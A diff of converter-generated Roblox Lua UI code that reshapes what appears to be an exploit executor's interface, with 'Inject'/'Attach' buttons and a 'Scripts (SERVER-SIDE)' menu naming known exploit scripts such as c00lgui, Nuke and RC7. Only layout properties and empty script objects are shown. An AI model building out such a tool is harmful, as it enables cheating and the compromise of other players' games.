+G2L["2b"]["Size"] = UDim2.new(0, 77, 0, 41);
 G2L["2b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["2b"]["Text"] = [[ATTACH]];
+G2L["2b"]["Text"] = [[Attach]];
 G2L["2b"]["Name"] = [[Inject]];
-G2L["2b"]["Position"] = UDim2.new(0.43651, 0, 0.87007, 0);
+G2L["2b"]["Position"] = UDim2.new(0.57895, 0, 0.83846, 0);
 
 
--- StarterGui.project CTRL.Frame.page2.Inject.UIStroke
+-- StarterGui.ScreenGui.Frame.page2.Inject.UIStroke
 G2L["2c"] = Instance.new("UIStroke", G2L["2b"]);
 
 
 
--- StarterGui.project CTRL.Frame.page2.Inject.UIStroke
+-- StarterGui.ScreenGui.Frame.page2.Inject.UIStroke
 G2L["2d"] = Instance.new("UIStroke", G2L["2b"]);
 G2L["2d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 G2L["2d"]["Thickness"] = 2;
 
 
--- StarterGui.project CTRL.Frame.page2.R6
+-- StarterGui.ScreenGui.Frame.page2.RE
 G2L["2e"] = Instance.new("TextButton", G2L["18"]);
 G2L["2e"]["TextWrapped"] = true;
 G2L["2e"]["BorderSizePixel"] = 0;
@@ -428,25 +429,25 @@ G2L["2e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["2e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["2e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
 G2L["2e"]["BackgroundTransparency"] = 1;
-G2L["2e"]["Size"] = UDim2.new(0, 66, 0, 33);
+G2L["2e"]["Size"] = UDim2.new(0, 37, 0, 41);
 G2L["2e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["2e"]["Text"] = [[R6]];
-G2L["2e"]["Name"] = [[R6]];
-G2L["2e"]["Position"] = UDim2.new(0.65079, 0, 0.87007, 0);
+G2L["2e"]["Text"] = [[RE]];
+G2L["2e"]["Name"] = [[RE]];
+G2L["2e"]["Position"] = UDim2.new(0.79224, 0, 0.83846, 0);
 
 
--- StarterGui.project CTRL.Frame.page2.R6.UIStroke
+-- StarterGui.ScreenGui.Frame.page2.RE.UIStroke
 G2L["2f"] = Instance.new("UIStroke", G2L["2e"]);
 
 
 
--- StarterGui.project CTRL.Frame.page2.R6.UIStroke
+-- StarterGui.ScreenGui.Frame.page2.RE.UIStroke
 G2L["30"] = Instance.new("UIStroke", G2L["2e"]);
 G2L["30"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 G2L["30"]["Thickness"] = 2;
 
 
--- StarterGui.project CTRL.Frame.page2.RE
+-- StarterGui.ScreenGui.Frame.page2.R6
 G2L["31"] = Instance.new("TextButton", G2L["18"]);
 G2L["31"]["TextWrapped"] = true;
 G2L["31"]["BorderSizePixel"] = 0;
@@ -456,795 +457,809 @@ G2L["31"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["31"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["31"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
 G2L["31"]["BackgroundTransparency"] = 1;
-G2L["31"]["Size"] = UDim2.new(0, 66, 0, 33);
+G2L["31"]["Size"] = UDim2.new(0, 37, 0, 41);
 G2L["31"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["31"]["Text"] = [[RESPAWN]];
-G2L["31"]["Name"] = [[RE]];
-G2L["31"]["Position"] = UDim2.new(0.8254, 0, 0.87007, 0);
+G2L["31"]["Text"] = [[R6]];
+G2L["31"]["Name"] = [[R6]];
+G2L["31"]["Position"] = UDim2.new(0.89474, 0, 0.83846, 0);
 
 
--- StarterGui.project CTRL.Frame.page2.RE.UIStroke
+-- StarterGui.ScreenGui.Frame.page2.R6.UIStroke
 G2L["32"] = Instance.new("UIStroke", G2L["31"]);
 
 
 
--- StarterGui.project CTRL.Frame.page2.RE.UIStroke
+-- StarterGui.ScreenGui.Frame.page2.R6.UIStroke
 G2L["33"] = Instance.new("UIStroke", G2L["31"]);
 G2L["33"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 G2L["33"]["Thickness"] = 2;
 
 
--- StarterGui.project CTRL.Frame.ImageButton
-G2L["34"] = Instance.new("ImageButton", G2L["2"]);
+-- StarterGui.ScreenGui.Frame.page3
+G2L["34"] = Instance.new("Frame", G2L["2"]);
+G2L["34"]["Visible"] = false;
 G2L["34"]["BorderSizePixel"] = 0;
-G2L["34"]["BackgroundTransparency"] = 1;
--- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
-G2L["34"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["34"]["Image"] = [[rbxassetid://4034483344]];
-G2L["34"]["Size"] = UDim2.new(0, 45, 0, 46);
+G2L["34"]["BackgroundColor3"] = Color3.fromRGB(91, 91, 91);
+G2L["34"]["Size"] = UDim2.new(0, 361, 0, 260);
+G2L["34"]["Position"] = UDim2.new(0.11302, 0, 0.12162, 0);
 G2L["34"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["34"]["Position"] = UDim2.new(0, 0, 0.12838, 0);
+G2L["34"]["Name"] = [[page3]];
+G2L["34"]["BackgroundTransparency"] = 0.5;
 
 
--- StarterGui.project CTRL.Frame.ImageButton.UIStroke
-G2L["35"] = Instance.new("UIStroke", G2L["34"]);
+-- StarterGui.ScreenGui.Frame.page3.TextLabel
+G2L["35"] = Instance.new("TextLabel", G2L["34"]);
+G2L["35"]["TextWrapped"] = true;
+G2L["35"]["BorderSizePixel"] = 0;
+G2L["35"]["TextSize"] = 14;
+G2L["35"]["TextScaled"] = true;
+G2L["35"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["35"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["35"]["TextColor3"] = Color3.fromRGB(171, 255, 0);
+G2L["35"]["BackgroundTransparency"] = 1;
+G2L["35"]["Size"] = UDim2.new(0, 361, 0, 29);
+G2L["35"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["35"]["Text"] = [[Scripts (SERVER-SIDE)]];
+
+
+-- StarterGui.ScreenGui.Frame.page3.TextLabel.UIStroke
+G2L["36"] = Instance.new("UIStroke", G2L["35"]);
 
 
 
--- StarterGui.project CTRL.Frame.ImageButton.LocalScript
-G2L["36"] = Instance.new("LocalScript", G2L["34"]);
-
-
-
--- StarterGui.project CTRL.Frame.ImageButton
-G2L["37"] = Instance.new("ImageButton", G2L["2"]);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame
+G2L["37"] = Instance.new("ScrollingFrame", G2L["34"]);
+G2L["37"]["Active"] = true;
 G2L["37"]["BorderSizePixel"] = 0;
-G2L["37"]["BackgroundTransparency"] = 1;
--- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
+G2L["37"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
+G2L["37"]["CanvasPosition"] = Vector2.new(0, 448);
 G2L["37"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["37"]["Image"] = [[rbxassetid://11570895459]];
-G2L["37"]["Size"] = UDim2.new(0, 45, 0, 46);
+G2L["37"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y;
+G2L["37"]["Size"] = UDim2.new(0, 361, 0, 231);
+G2L["37"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["37"]["Position"] = UDim2.new(0, 0, 0.11154, 0);
 G2L["37"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["37"]["Position"] = UDim2.new(0, 0, 0.28378, 0);
+G2L["37"]["ScrollBarThickness"] = 3;
+G2L["37"]["BackgroundTransparency"] = 11;
 
 
--- StarterGui.project CTRL.Frame.ImageButton.UIStroke
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.UIStroke
 G2L["38"] = Instance.new("UIStroke", G2L["37"]);
 
 
 
--- StarterGui.project CTRL.Frame.ImageButton.LocalScript
-G2L["39"] = Instance.new("LocalScript", G2L["37"]);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.UIListLayout
+G2L["39"] = Instance.new("UIListLayout", G2L["37"]);
+G2L["39"]["Padding"] = UDim.new(0, 1);
+G2L["39"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
 
 
-
--- StarterGui.project CTRL.Frame.ImageButton
-G2L["3a"] = Instance.new("ImageButton", G2L["2"]);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
+G2L["3a"] = Instance.new("TextButton", G2L["37"]);
+G2L["3a"]["TextWrapped"] = true;
 G2L["3a"]["BorderSizePixel"] = 0;
-G2L["3a"]["BackgroundTransparency"] = 1;
--- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
+G2L["3a"]["TextSize"] = 14;
+G2L["3a"]["TextScaled"] = true;
+G2L["3a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["3a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["3a"]["Image"] = [[rbxassetid://14895352864]];
-G2L["3a"]["Size"] = UDim2.new(0, 45, 0, 46);
+G2L["3a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["3a"]["BackgroundTransparency"] = 1;
+G2L["3a"]["Size"] = UDim2.new(0, 361, 0, 33);
 G2L["3a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["3a"]["Position"] = UDim2.new(0, 0, 0.43919, 0);
+G2L["3a"]["Text"] = [[c00lgui]];
 
 
--- StarterGui.project CTRL.Frame.ImageButton.UIStroke
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
 G2L["3b"] = Instance.new("UIStroke", G2L["3a"]);
 
 
 
--- StarterGui.project CTRL.Frame.ImageButton.LocalScript
-G2L["3c"] = Instance.new("LocalScript", G2L["3a"]);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["3c"] = Instance.new("UIStroke", G2L["3a"]);
+G2L["3c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+
+
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+G2L["3d"] = Instance.new("LocalScript", G2L["3a"]);
 
 
 
--- StarterGui.project CTRL.Frame.page3
-G2L["3d"] = Instance.new("Frame", G2L["2"]);
-G2L["3d"]["Visible"] = false;
-G2L["3d"]["BorderSizePixel"] = 0;
-G2L["3d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["3d"]["Size"] = UDim2.new(0, 378, 0, 258);
-G2L["3d"]["Position"] = UDim2.new(0.10638, 0, 0.12838, 0);
-G2L["3d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["3d"]["Name"] = [[page3]];
-G2L["3d"]["BackgroundTransparency"] = 1;
-
-
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame
-G2L["3e"] = Instance.new("ScrollingFrame", G2L["3d"]);
-G2L["3e"]["Active"] = true;
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
+G2L["3e"] = Instance.new("TextButton", G2L["37"]);
+G2L["3e"]["TextWrapped"] = true;
 G2L["3e"]["BorderSizePixel"] = 0;
-G2L["3e"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
+G2L["3e"]["TextSize"] = 14;
+G2L["3e"]["TextScaled"] = true;
+G2L["3e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["3e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["3e"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y;
-G2L["3e"]["Size"] = UDim2.new(0, 375, 0, 230);
-G2L["3e"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["3e"]["Position"] = UDim2.new(0.00794, 0, 0.10853, 0);
-G2L["3e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["3e"]["ScrollBarThickness"] = 3;
+G2L["3e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
 G2L["3e"]["BackgroundTransparency"] = 1;
+G2L["3e"]["Size"] = UDim2.new(0, 361, 0, 33);
+G2L["3e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["3e"]["Text"] = [[DEX SS]];
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.UIStroke
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
 G2L["3f"] = Instance.new("UIStroke", G2L["3e"]);
 
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.UIListLayout
-G2L["40"] = Instance.new("UIListLayout", G2L["3e"]);
-G2L["40"]["Padding"] = UDim.new(0, 1);
-G2L["40"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["40"] = Instance.new("UIStroke", G2L["3e"]);
+G2L["40"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton
-G2L["41"] = Instance.new("TextButton", G2L["3e"]);
-G2L["41"]["TextWrapped"] = true;
-G2L["41"]["BorderSizePixel"] = 0;
-G2L["41"]["TextSize"] = 14;
-G2L["41"]["TextScaled"] = true;
-G2L["41"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["41"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["41"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["41"]["BackgroundTransparency"] = 1;
-G2L["41"]["Size"] = UDim2.new(0, 375, 0, 29);
-G2L["41"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["41"]["Text"] = [[c00lgui]];
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+G2L["41"] = Instance.new("LocalScript", G2L["3e"]);
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.UIStroke
-G2L["42"] = Instance.new("UIStroke", G2L["41"]);
 
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
+G2L["42"] = Instance.new("TextButton", G2L["37"]);
+G2L["42"]["TextWrapped"] = true;
+G2L["42"]["BorderSizePixel"] = 0;
+G2L["42"]["TextSize"] = 14;
+G2L["42"]["TextScaled"] = true;
+G2L["42"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["42"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["42"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["42"]["BackgroundTransparency"] = 1;
+G2L["42"]["Size"] = UDim2.new(0, 361, 0, 33);
+G2L["42"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["42"]["Text"] = [[HD Admin]];
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.UIStroke
-G2L["43"] = Instance.new("UIStroke", G2L["41"]);
-G2L["43"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["43"] = Instance.new("UIStroke", G2L["42"]);
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.LocalScript
-G2L["44"] = Instance.new("LocalScript", G2L["41"]);
 
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["44"] = Instance.new("UIStroke", G2L["42"]);
+G2L["44"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Notify
-G2L["45"] = Instance.new("LocalScript", G2L["41"]);
-G2L["45"]["Name"] = [[Notify]];
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+G2L["45"] = Instance.new("LocalScript", G2L["42"]);
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Warner
-G2L["46"] = Instance.new("LocalScript", G2L["41"]);
-G2L["46"]["Name"] = [[Warner]];
 
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
+G2L["46"] = Instance.new("TextButton", G2L["37"]);
+G2L["46"]["TextWrapped"] = true;
+G2L["46"]["BorderSizePixel"] = 0;
+G2L["46"]["TextSize"] = 14;
+G2L["46"]["TextScaled"] = true;
+G2L["46"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["46"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["46"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["46"]["BackgroundTransparency"] = 1;
+G2L["46"]["Size"] = UDim2.new(0, 361, 0, 33);
+G2L["46"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["46"]["Text"] = [[k00pGUI]];
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton
-G2L["47"] = Instance.new("TextButton", G2L["3e"]);
-G2L["47"]["TextWrapped"] = true;
-G2L["47"]["BorderSizePixel"] = 0;
-G2L["47"]["TextSize"] = 14;
-G2L["47"]["TextScaled"] = true;
-G2L["47"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["47"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["47"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["47"]["BackgroundTransparency"] = 1;
-G2L["47"]["Size"] = UDim2.new(0, 375, 0, 29);
-G2L["47"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["47"]["Text"] = [[HD Ranker]];
 
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["47"] = Instance.new("UIStroke", G2L["46"]);
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.UIStroke
-G2L["48"] = Instance.new("UIStroke", G2L["47"]);
 
 
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["48"] = Instance.new("UIStroke", G2L["46"]);
+G2L["48"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.UIStroke
-G2L["49"] = Instance.new("UIStroke", G2L["47"]);
-G2L["49"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+G2L["49"] = Instance.new("LocalScript", G2L["46"]);
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.LocalScript
-G2L["4a"] = Instance.new("LocalScript", G2L["47"]);
 
 
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
+G2L["4a"] = Instance.new("TextButton", G2L["37"]);
+G2L["4a"]["TextWrapped"] = true;
+G2L["4a"]["BorderSizePixel"] = 0;
+G2L["4a"]["TextSize"] = 14;
+G2L["4a"]["TextScaled"] = true;
+G2L["4a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["4a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["4a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["4a"]["BackgroundTransparency"] = 1;
+G2L["4a"]["Size"] = UDim2.new(0, 361, 0, 33);
+G2L["4a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["4a"]["Text"] = [[HappyHub]];
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Notify
-G2L["4b"] = Instance.new("LocalScript", G2L["47"]);
-G2L["4b"]["Name"] = [[Notify]];
 
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["4b"] = Instance.new("UIStroke", G2L["4a"]);
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Warner
-G2L["4c"] = Instance.new("LocalScript", G2L["47"]);
-G2L["4c"]["Name"] = [[Warner]];
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton
-G2L["4d"] = Instance.new("TextButton", G2L["3e"]);
-G2L["4d"]["TextWrapped"] = true;
-G2L["4d"]["BorderSizePixel"] = 0;
-G2L["4d"]["TextSize"] = 14;
-G2L["4d"]["TextScaled"] = true;
-G2L["4d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["4d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["4d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["4d"]["BackgroundTransparency"] = 1;
-G2L["4d"]["Size"] = UDim2.new(0, 375, 0, 29);
-G2L["4d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["4d"]["Text"] = [[Silent SS]];
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["4c"] = Instance.new("UIStroke", G2L["4a"]);
+G2L["4c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.UIStroke
-G2L["4e"] = Instance.new("UIStroke", G2L["4d"]);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+G2L["4d"] = Instance.new("LocalScript", G2L["4a"]);
 
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.UIStroke
-G2L["4f"] = Instance.new("UIStroke", G2L["4d"]);
-G2L["4f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
+G2L["4e"] = Instance.new("TextButton", G2L["37"]);
+G2L["4e"]["TextWrapped"] = true;
+G2L["4e"]["BorderSizePixel"] = 0;
+G2L["4e"]["TextSize"] = 14;
+G2L["4e"]["TextScaled"] = true;
+G2L["4e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["4e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["4e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["4e"]["BackgroundTransparency"] = 1;
+G2L["4e"]["Size"] = UDim2.new(0, 361, 0, 33);
+G2L["4e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["4e"]["Text"] = [[RC7]];
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.LocalScript
-G2L["50"] = Instance.new("LocalScript", G2L["4d"]);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["4f"] = Instance.new("UIStroke", G2L["4e"]);
 
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Notify
-G2L["51"] = Instance.new("LocalScript", G2L["4d"]);
-G2L["51"]["Name"] = [[Notify]];
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["50"] = Instance.new("UIStroke", G2L["4e"]);
+G2L["50"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Warner
-G2L["52"] = Instance.new("LocalScript", G2L["4d"]);
-G2L["52"]["Name"] = [[Warner]];
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+G2L["51"] = Instance.new("LocalScript", G2L["4e"]);
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton
-G2L["53"] = Instance.new("TextButton", G2L["3e"]);
-G2L["53"]["TextWrapped"] = true;
-G2L["53"]["BorderSizePixel"] = 0;
-G2L["53"]["TextSize"] = 14;
-G2L["53"]["TextScaled"] = true;
-G2L["53"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["53"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["53"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["53"]["BackgroundTransparency"] = 1;
-G2L["53"]["Size"] = UDim2.new(0, 375, 0, 29);
-G2L["53"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["53"]["Text"] = [[l0stAdmin]];
 
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
+G2L["52"] = Instance.new("TextButton", G2L["37"]);
+G2L["52"]["TextWrapped"] = true;
+G2L["52"]["BorderSizePixel"] = 0;
+G2L["52"]["TextSize"] = 14;
+G2L["52"]["TextScaled"] = true;
+G2L["52"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["52"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["52"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["52"]["BackgroundTransparency"] = 1;
+G2L["52"]["Size"] = UDim2.new(0, 361, 0, 33);
+G2L["52"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["52"]["Text"] = [[KJ]];
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.UIStroke
-G2L["54"] = Instance.new("UIStroke", G2L["53"]);
 
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["53"] = Instance.new("UIStroke", G2L["52"]);
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.UIStroke
-G2L["55"] = Instance.new("UIStroke", G2L["53"]);
-G2L["55"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["54"] = Instance.new("UIStroke", G2L["52"]);
+G2L["54"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.LocalScript
-G2L["56"] = Instance.new("LocalScript", G2L["53"]);
 
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+G2L["55"] = Instance.new("LocalScript", G2L["52"]);
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Notify
-G2L["57"] = Instance.new("LocalScript", G2L["53"]);
-G2L["57"]["Name"] = [[Notify]];
 
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
+G2L["56"] = Instance.new("TextButton", G2L["37"]);
+G2L["56"]["TextWrapped"] = true;
+G2L["56"]["BorderSizePixel"] = 0;
+G2L["56"]["TextSize"] = 14;
+G2L["56"]["TextScaled"] = true;
+G2L["56"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["56"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["56"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["56"]["BackgroundTransparency"] = 1;
+G2L["56"]["Size"] = UDim2.new(0, 361, 0, 33);
+G2L["56"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["56"]["Text"] = [[Nuke]];
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Warner
-G2L["58"] = Instance.new("LocalScript", G2L["53"]);
-G2L["58"]["Name"] = [[Warner]];
 
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["57"] = Instance.new("UIStroke", G2L["56"]);
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton
-G2L["59"] = Instance.new("TextButton", G2L["3e"]);
-G2L["59"]["TextWrapped"] = true;
-G2L["59"]["BorderSizePixel"] = 0;
-G2L["59"]["TextSize"] = 14;
-G2L["59"]["TextScaled"] = true;
-G2L["59"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["59"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["59"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["59"]["BackgroundTransparency"] = 1;
-G2L["59"]["Size"] = UDim2.new(0, 375, 0, 29);
-G2L["59"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["59"]["Text"] = [[Polaria]];
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.UIStroke
-G2L["5a"] = Instance.new("UIStroke", G2L["59"]);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["58"] = Instance.new("UIStroke", G2L["56"]);
+G2L["58"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
